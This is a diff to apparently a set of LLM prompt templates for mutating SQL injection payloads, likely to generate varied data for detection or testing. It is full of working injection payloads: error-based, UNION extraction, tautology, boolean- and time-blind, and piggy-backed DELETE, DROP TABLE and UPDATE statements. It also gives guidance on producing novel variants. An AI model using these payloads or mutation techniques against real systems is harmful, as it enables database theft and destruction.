@@ -40,6 +40,14 @@ You are a SQL injection security researcher specializing in payload mutation. Yo
 `tautology`, `error_based`, `union_query`, `piggy_backed`, `boolean_blind`,
 and `time_blind`.
 
+**Reference Scope**: The kind of data the payload core is allowed to refer to;
+it does not describe the injection technique.
+- `lor`: literal-only; use no `$...$` data-reference placeholders.
+- `tsr`: target-schema reference; use `$table_N$`, `$column_tN_M$`, and
+  `$sample_tN_M$` placeholders for the target database.
+- `scr`: system-catalog reference; use `$sysInfo$` for system variables or
+  catalog data, not target-schema table or column placeholders.
+
 **Technique Form**: Different implementation methods within the SAME technique. For example, error-based injection can be implemented through:
 - Type conversion functions (CAST, CONVERT) - force string-to-number conversion to trigger errors
 - Implicit type conversion - use comparison operators (=, >, <) between incompatible types
@@ -62,6 +70,13 @@ Given the following `{technique}` payload core, mutate it by changing the **tech
 The following describes various implementation forms for `{technique}`. Select a meaningfully different form.
 
 {dimensions}
+
+## Anti-Imitation Few-Shot Context
+If present, the following category-matched examples are payload cores already
+explored by the training library or prior successful mutations. Treat them as
+negative examples: they show forms to avoid copying, lightly editing, or
+combining. Produce a meaningfully different core while preserving the given
+technique and reference scope.
 
 {memory_addons}
 
@@ -88,6 +103,14 @@ You are a SQL injection security researcher specializing in query structure anal
 
 **Technique**: The SQL injection category. This defines WHAT the injection aims to achieve.
 
+**Reference Scope**: The kind of data the payload core is allowed to refer to;
+it does not describe the injection technique.
+- `lor`: literal-only; use no `$...$` data-reference placeholders.
+- `tsr`: target-schema reference; use `$table_N$`, `$column_tN_M$`, and
+  `$sample_tN_M$` placeholders for the target database.
+- `scr`: system-catalog reference; use `$sysInfo$` for system variables or
+  catalog data, not target-schema table or column placeholders.
+
 **Technique Form**: The specific implementation method within a technique. This defines HOW the injection is implemented.
 
 **SQL Structure**: The database query patterns embedded within a payload, which is the focus of this task. This includes:
@@ -113,6 +136,13 @@ Given the following payload core, mutate its **SQL query structure** while keepi
 The following describes various SQL structure patterns you can use. Choose a DIFFERENT structure pattern from what the original payload uses.
 
 {dimensions}
+
+## Anti-Imitation Few-Shot Context
+If present, the following category-matched examples are payload cores already
+explored by the training library or prior successful mutations. Treat them as
+negative examples: they show forms to avoid copying, lightly editing, or
+combining. Produce a meaningfully different core while preserving the given
+technique, reference scope, and technique form.
 
 {memory_addons}
 
@@ -160,9 +190,9 @@ will try to convert it and FAIL, producing an error message that INCLUDES the or
 **Functions:** CAST(X AS UNSIGNED), CAST(X AS DECIMAL), CAST(X AS SIGNED), CONVERT(X, UNSIGNED)
 
 **Reference examples:**
-- `' AND CAST('abc' AS UNSIGNED) = 1--`
-- `' AND CONVERT($sysInfo$, UNSIGNED)>$int$--`
-- `' AND CAST((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) AS DECIMAL) = $float$--`
+- `' AND CAST('abc' AS UNSIGNED) = 1`
+- `' AND CONVERT($sysInfo$, UNSIGNED)>$int$`
+- `' AND CAST((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) AS DECIMAL) = $float$`
 
 ### 2. Implicit Type Conversion Attacks
 **Why it works:** When you compare a STRING with a NUMBER using comparison operators, 
@@ -171,8 +201,8 @@ the database performs implicit type conversion, triggering an error containing t
 **Operators:** =, >, <, >=, <=, BETWEEN...AND, !=, <>, IN(...), arithmetic operators (+, -, *, /)
 
 **Reference examples:**
-- `' AND 'simple example' + 0--`
-- `' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$--`
+- `' AND 'simple example' + 0`
+- `' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$`
 
 ### 3. Math Function Attacks
 **Why it works:** Math functions expect NUMERIC inputs. Passing a STRING or invalid value 
@@ -181,10 +211,10 @@ causes an error that may reveal the input value.
 **Functions:** SQRT(X), LOG(X), LOG2(X), LOG10(X), LN(X), MOD(X, Y), Division (X/0)
 
 **Reference examples:**
-- `' AND SQRT(-1)--`
-- `' AND 1/(SELECT 0)--`
-- `' AND SQRT($sysInfo$)--`
-- `' AND SQRT(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)--`
+- `' AND SQRT(-1)`
+- `' AND 1/(SELECT 0)`
+- `' AND SQRT($sysInfo$)`
+- `' AND SQRT(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)`
 
 ### 4. XML Function Attacks (MySQL Specific)
 **Why it works:** extractvalue() and updatexml() parse XML and throw errors with 
@@ -193,9 +223,9 @@ specific XPATH syntax errors that include the payload content.
 **Functions:** extractvalue(xml, xpath), updatexml(xml, xpath, new_value)
 
 **Reference examples:**
-- `' AND extractvalue(1,concat(0x1fde75d7,'daiodww',0x1fde75d7))--`
-- `' AND extractvalue(1,concat($hex$,($sysInfo$),$hex$))--`
-- `' AND extractvalue(1,concat($hex$,(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$hex$))--`
+- `' AND extractvalue(1,concat(0x1fde75d7,'daiodww',0x1fde75d7))`
+- `' AND extractvalue(1,concat($hex$,($sysInfo$),$hex$))`
+- `' AND extractvalue(1,concat($hex$,(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$hex$))`
 
 ### 5. GTID Function Attacks (MySQL 5.6+)
 **Why it works:** GTID functions expect specific format. Invalid input causes descriptive errors.
@@ -203,9 +233,9 @@ specific XPATH syntax errors that include the payload content.
 **Functions:** GTID_SUBSET(set1, set2), GTID_SUBTRACT(set1, set2)
 
 **Example patterns:**
-- constant: `' AND GTID_SUBSET('learning',1) = 1--`
-- system info: `' AND GTID_SUBSET(($sysInfo$),$character$)=1--`
-- specific db: `' AND GTID_SUBSET((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$int$) = 1--`
+- constant: `' AND GTID_SUBSET('learning',1) = 1`
+- system info: `' AND GTID_SUBSET(($sysInfo$),$character$)=1`
+- specific db: `' AND GTID_SUBSET((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$int$) = 1`
 
 ### 6. String Function Attacks
 **Why it works:** String functions with invalid arguments cause errors that may reveal data.
@@ -213,8 +243,8 @@ specific XPATH syntax errors that include the payload content.
 **Functions:** SUBSTR(X, start, length), MID(X, pos, len)
 
 **Example patterns:**
-- constant: `' AND SUBSTR('test', 1, -1)--`, `' AND SUBSTR('test', 'fly', 1)--`
-- system info: `' AND SUBSTR($sysInfo$, $int$, $int$)=$character$--`
+- constant: `' AND SUBSTR('test', 1, -1)`, `' AND SUBSTR('test', 'fly', 1)`
+- system info: `' AND SUBSTR($sysInfo$, $int$, $int$)=$character$`
 
 ### 7. Date/Time Function Attacks
 **Why it works:** Date/time functions expect valid format. Invalid input reveals data in error.
@@ -222,16 +252,16 @@ specific XPATH syntax errors that include the payload content.
 **Functions:** TIME(X), DATE(X), TO_DAYS(X)
 
 **Reference examples:**
-- `' AND TIME($sysInfo$)=$time$--`
-- `' AND TIME(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $time$--`
+- `' AND TIME($sysInfo$)=$time$`
+- `' AND TIME(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $time$`
 
 ### 8. Overflow Attacks
 **Why it works:** Integer/float overflow causes specific errors.
 
 **Reference examples(constant only):**
-- `' AND (SELECT 9223372036854775807 + 1)--` (integer overflow)
-- `' AND (SELECT -9223372036854775808 - 1)--` (integer underflow)
-- `' AND (SELECT 1.7976931348623157e+308 * 2)--` (float overflow)
+- `' AND (SELECT 9223372036854775807 + 1)` (integer overflow)
+- `' AND (SELECT -9223372036854775808 - 1)` (integer underflow)
+- `' AND (SELECT 1.7976931348623157e+308 * 2)` (float overflow)
 """
 
 
@@ -246,8 +276,8 @@ the column count and types of the original query.
 **Why it's needed:** UNION requires both queries to have the SAME number of columns.
 Attackers first probe to find how many columns the original query returns.
 
-**ORDER BY Method:** `' ORDER BY 1--` (increase number until error)
-**GROUP BY Method:** `' GROUP BY 1--`, increase number until error and with optional HAVING clause
+**ORDER BY Method:** `' ORDER BY 1` (increase number until error)
+**GROUP BY Method:** `' GROUP BY 1`, increase number until error and with optional HAVING clause
 
 ### 2. UNION Variants
 - `UNION SELECT`: Standard union, removes duplicate rows
@@ -258,21 +288,21 @@ Attackers first probe to find how many columns the original query returns.
 **Why NULL is useful:** NULL is type-agnostic, works when column type is unknown.
 
 **Reference examples:**
-- `' UNION SELECT NULL--`
-- `' UNION SELECT 'name'--`
-- `' UNION SELECT 36282--`
+- `' UNION SELECT NULL`
+- `' UNION SELECT 'name'`
+- `' UNION SELECT 36282`
 
 ### 4. System Information Extraction
 **Reference examples:**
-- `' UNION ALL $sysInfo$--`
+- `' UNION ALL $sysInfo$`
 
 ### 5. Specific Database Extraction
 **Reference examples:**
-- `' UNION SELECT $column_t1_1$ FROM $table_1$--`
+- `' UNION SELECT $column_t1_1$ FROM $table_1$`
 
 **Note:** You can explore adding WHERE conditions, using UNION ALL vs UNION, or creating multi-table JOINs.
-- `' UNION SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$--`
-- `' UNION SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$--`
+- `' UNION SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$`
+- `' UNION SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$`
 """
 
 
@@ -285,23 +315,23 @@ overall condition evaluate to TRUE regardless of the original condition.
 
 ### 1. Basic Numeric Tautologies
 **Why they work:** Simple numeric comparisons that are mathematically always true.
-**Reference:** `' OR 1=1--`
+**Reference:** `' OR 1=1`
 **Explore:** Different numbers, operators (=, >, <, >=, <=), arithmetic expressions(+,-,*,/,%)
 
 ### 2. String Tautologies
 **Why they work:** String comparisons that are always true.
-**Reference:** `' OR 'a' LIKE '%'--`
+**Reference:** `' OR 'a' LIKE '%'`
 **Explore:** Different LIKE patterns, REGEXP patterns
 
 ### 3. String Function Tautologies
 **Why they work:** Using SQL functions to construct always-true conditions.
 **Functions:** LENGTH, TRIM, LOWER, UPPER, SUBSTRING, REPLACE, INSTR, LTRIM, RTRIM
-**Reference:** `' OR LENGTH('')=0--`, `' OR SUBSTRING('test',1,1)='t'--`
+**Reference:** `' OR LENGTH('')=0`, `' OR SUBSTRING('test',1,1)='t'`
 
 ### 4. Math Function Tautologies
 **Why they work:** Mathematical functions with predictable results.
 **Functions:** ABS, ROUND, CEIL, FLOOR, LEAST, GREATEST
-**Reference:** `' OR ABS(-5)=5--`
+**Reference:** `' OR ABS(-5)=5`
 
 ### 5. NULL Handling Tautologies
 **Why they work:** NULL handling functions with known behavior.
@@ -309,27 +339,27 @@ overall condition evaluate to TRUE regardless of the original condition.
 
 ### 6. Conditional Tautologies
 **Why they work:** Conditional expressions that always evaluate to true.
-**Reference:** `' OR IF(1=1,'true','false')='true'--`
+**Reference:** `' OR IF(1=1,'true','false')='true'`
 **Explore:** IF, CASE WHEN structures
 
 ### 7. System Information Tautologies
 **Reference examples:**
-- `' OR ($sysInfo$)>0--`
-- `' OR ($sysInfo$) REGEXP '[a-z]'--`
-- `' OR ($sysInfo$)=($sysInfo$)--`
+- `' OR ($sysInfo$)>0`
+- `' OR ($sysInfo$) REGEXP '[a-z]'`
+- `' OR ($sysInfo$)=($sysInfo$)`
 
 **Explore:** Different comparison operators, LIKE, REGEXP, LENGTH, IS NOT NULL, EXISTS, IN(...), BETWEEN...AND, !=, <>, arithmetic operators (+, -, *, /, %), string functions (SUBSTRING, REPLACE, INSTR, LTRIM, RTRIM), math functions (ABS, ROUND, CEIL, FLOOR, LEAST, GREATEST), NULL handling functions (COALESCE, IFNULL, ISNULL, NULLIF), conditional tautologies (IF, CASE WHEN)
 
 ### 8. Specific Database Tautologies
 **Reference examples:**
-- `' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>0--`
-- `' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$--`
-- `' OR COALESCE(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)--`
-- `' OR SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) = $character$--`
+- `' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>0`
+- `' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$`
+- `' OR COALESCE(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)`
+- `' OR SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) = $character$`
 
 **Explore:** Single table vs multi-table JOIN, different comparison methods
-- `' OR LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>0--`
-- `' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$--`
+- `' OR LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>0`
+- `' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$`
 """
 
 
@@ -359,24 +389,24 @@ and observes the APPLICATION BEHAVIOR to determine if the condition was true or 
 - `LENGTH(X) = N` → Is the string exactly N characters?
 
 ### 5. Conditional Wrappers
-- Direct: `' AND condition--`
-- CASE WHEN: `' AND CASE WHEN condition THEN 1 ELSE 0 END = 1--`
-- IF: `' AND IF(condition, 1, 0) = 1--`
+- Direct: `' AND condition`
+- CASE WHEN: `' AND CASE WHEN condition THEN 1 ELSE 0 END = 1`
+- IF: `' AND IF(condition, 1, 0) = 1`
 
 ### 6. System Information Patterns
 **Reference examples:**
-- `' AND ($sysInfo$) REGEXP '[0-9]'--`
-- `' AND SUBSTR($sysInfo$, 1, 1) > $character$--`
-- `' AND IF(($sysInfo$)>$int$,1,0)=1--`
+- `' AND ($sysInfo$) REGEXP '[0-9]'`
+- `' AND SUBSTR($sysInfo$, 1, 1) > $character$`
+- `' AND IF(($sysInfo$)>$int$,1,0)=1`
 
 **Explore:** Different comparison operators, LIKE patterns, character extraction positions
 
 ### 7. Specific Database Patterns
 **Reference examples:**
-- `' AND (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$--`
-- `' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) LIKE $character$--`
-- `' AND IF((SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$,1,0) = 1--`
-- `' AND SUBSTR(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$, 1, 1) > $character$--`
+- `' AND (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$`
+- `' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) LIKE $character$`
+- `' AND IF((SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$,1,0) = 1`
+- `' AND SUBSTR(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$, 1, 1) > $character$`
 
 **Explore:** Single table vs multi-table JOIN, different conditional wrappers
 """
@@ -402,28 +432,28 @@ if conditions are true or false.
 
 ### 3. Constant Patterns
 **Reference examples:**
-- `' OR SLEEP(5)--`
-- `' AND IF(191 = 191,SLEEP(5),0)--`
-- `' AND BENCHMARK(500000,MD5('example'))--`
+- `' OR SLEEP(5)`
+- `' AND IF(191 = 191,SLEEP(5),0)`
+- `' AND BENCHMARK(500000,MD5('example'))`
 
 **Explore:** Different conditional structures, EXISTS wrapper, CASE WHEN wrapper, WHERE wrapper, etc.
 
 ### 4. System Information Patterns
 **Reference examples:**
-- `' AND SELECT SLEEP($int$) WHERE ($sysInfo$)>0--`
-- `' AND SELECT SLEEP($int$) WHERE ($sysInfo$) LIKE $character$--`
-- `' AND CASE WHEN ($sysInfo$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END--`
-- `' AND SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR($sysInfo$,1,1) IN ('a','e','i','o','u')--`
+- `' AND SELECT SLEEP($int$) WHERE ($sysInfo$)>0`
+- `' AND SELECT SLEEP($int$) WHERE ($sysInfo$) LIKE $character$`
+- `' AND CASE WHEN ($sysInfo$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END`
+- `' AND SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR($sysInfo$,1,1) IN ('a','e','i','o','u')`
 **Heavy query (Cartesian join):**
-- `' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)=45678--`
+- `' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)=45678`
 **Explore:** Different conditional structures, character extraction
 
 ### 5. Specific Database Patterns
 **Reference examples:**
-- `' AND IF((SELECT SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,$int$,1)) = $character$,SLEEP($int$),0)--`
-- `' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$--`
+- `' AND IF((SELECT SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,$int$,1)) = $character$,SLEEP($int$),0)`
+- `' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$`
 **Heavy query (Cartesian join):**
-- `' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)=$int$--`
+- `' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)=$int$`
 **Explore:** Single table vs multi-table JOIN, different delay methods (SLEEP vs BENCHMARK)
 """
 
@@ -444,16 +474,16 @@ but many other configurations block them.
 ### SQL Statement Types
 
 **1. SELECT** - Data retrieval
-**Reference:** `'; SELECT $column_t1_1$ FROM $table_1$;--`
+**Reference:** `'; SELECT $column_t1_1$ FROM $table_1$;`
 
 **2. DELETE** - Data deletion
-**Reference:** `'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;--`, `'; DELETE FROM $table_1$ WHERE $column_t1_1$ = $sample_t1_1$;--`
+**Reference:** `'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;`, `'; DELETE FROM $table_1$ WHERE $column_t1_1$ = $sample_t1_1$;`
 
 **3. DROP** - Table destruction
-**Reference:** `'; DROP TABLE IF EXISTS $table_1$;--`
+**Reference:** `'; DROP TABLE IF EXISTS $table_1$;`
 
 **4. UPDATE** - Data modification
-**Reference:** `'; UPDATE $table_1$ SET $column_t1_1$ = $int$ WHERE $column_t1_2$ = $sample_t1_2$;--`
+**Reference:** `'; UPDATE $table_1$ SET $column_t1_1$ = $int$ WHERE $column_t1_2$ = $sample_t1_2$;`
 
 **5. INSERT** - Data insertion
 **Explore:** INSERT INTO ... SELECT patterns
